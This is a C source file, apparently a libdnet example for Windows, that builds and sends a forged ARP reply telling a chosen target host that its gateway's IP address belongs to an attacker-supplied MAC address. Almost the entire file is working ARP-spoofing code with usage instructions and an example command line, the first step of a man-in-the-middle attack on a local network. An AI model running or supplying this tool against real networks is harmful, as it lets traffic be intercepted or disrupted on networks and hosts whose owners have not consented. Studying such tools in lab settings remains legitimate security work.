/*
 * libdnet Windows ARP Spoofing Example
 *
 * Features: Send crafted ARP packets
 *
 * Compile:
 * gcc -I../include -L../src/.libs -o arp_spoof.exe arp_spoof.c -ldnet -lws2_32 -liphlpapi
 *
 * Run:
 * arp_spoof.exe <interface_name> <target_ip> <gateway_ip> <spoofed_mac>
 *
 * Example:
 * arp_spoof.exe "Ethernet" 192.168.1.100 192.168.1.1 00:11:22:33:44:55
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include "dnet.h"

int main(int argc, char *argv[])
{
    eth_t *eth;
    arp_t *arp;
    intf_t *intf;
    eth_addr_t src_mac, dst_mac, spoofed_mac;
    struct addr target_ip, gateway_ip, src_ip;
    u_char frame[512];
    struct eth_hdr *ethh;
    struct arp_hdr *arph;
    struct arp_ethip *arp_ethip;
    struct intf_entry entry;
    char buf[1024];
    const char *intf_name;

    if (argc < 5) {
        fprintf(stderr, "Usage: %s <interface> <target_ip> <gateway_ip> <spoofed_mac>\n", argv[0]);
        fprintf(stderr, "Example: %s Ethernet 192.168.1.100 192.168.1.1 00:11:22:33:44:55\n", argv[0]);
        return 1;
    }

    intf_name = argv[1];

    printf("=== libdnet ARP Spoofing Example ===\n");
    printf("Interface: %s\n", intf_name);
    printf("Target IP: %s\n", argv[2]);
    printf("Gateway IP: %s\n", argv[3]);
    printf("Spoofed MAC: %s\n\n", argv[4]);

    if (addr_aton(argv[2], &target_ip) < 0 || addr_aton(argv[3], &gateway_ip) < 0) {
        fprintf(stderr, "Error: invalid IP address\n");
        return 1;
    }

    if (eth_pton(argv[4], &spoofed_mac) < 0) {
        fprintf(stderr, "Error: invalid MAC address\n");
        return 1;
    }

    if ((eth = eth_open(intf_name)) == NULL) {
        fprintf(stderr, "Error: unable to open Ethernet interface\n");
        return 1;
    }

    if ((intf = intf_open()) == NULL) {
        fprintf(stderr, "Error: unable to open interface\n");
        eth_close(eth);
        return 1;
    }

    memset(&entry, 0, sizeof(entry));
    entry.intf_len = sizeof(buf);
    strncpy(entry.intf_name, intf_name, sizeof(entry.intf_name) - 1);

    if (intf_get(intf, &entry) < 0) {
        fprintf(stderr, "Error: unable to get interface info\n");
        intf_close(intf);
        eth_close(eth);
        return 1;
    }

    memcpy(&src_ip, &entry.intf_addr, sizeof(src_ip));
    memcpy(&src_mac, &entry.intf_link_addr, sizeof(src_mac));

    memset(dst_mac.data, 0xff, 6);

    memset(frame, 0, sizeof(frame));
    ethh = (struct eth_hdr *)frame;
    arph = (struct arp_hdr *)(frame + 14);

    memcpy(&ethh->eth_dst, &dst_mac, 6);
    memcpy(&ethh->eth_src, &src_mac, 6);
    ethh->eth_type = htons(ETH_TYPE_ARP);

    arph->ar_hrd = htons(ARP_HRD_ETH);
    arph->ar_pro = htons(ARP_PRO_IP);
    arph->ar_hln = 6;
    arph->ar_pln = 4;
    arph->ar_op = htons(ARP_OP_REPLY);

    arp_ethip = (struct arp_ethip *)(arph + 1);
    memcpy(&arp_ethip->ar_sha, &spoofed_mac, 6);
    memcpy(&arp_ethip->ar_spa, &gateway_ip.addr_ip, 4);
    memcpy(&arp_ethip->ar_tha, dst_mac.data, 6);
    memcpy(&arp_ethip->ar_tpa, &target_ip.addr_ip, 4);

    printf("Sending ARP Reply...\n");
    printf("  Telling %s that %s is at %s\n", argv[2], argv[3], argv[4]);

    if (eth_send(eth, frame, 42) < 0) {
        fprintf(stderr, "Error: send failed\n");
    } else {
        printf("[OK] ARP Reply sent\n");
    }

    eth_close(eth);
    intf_close(intf);
    printf("\n=== Done ===\n");
    return 0;
}
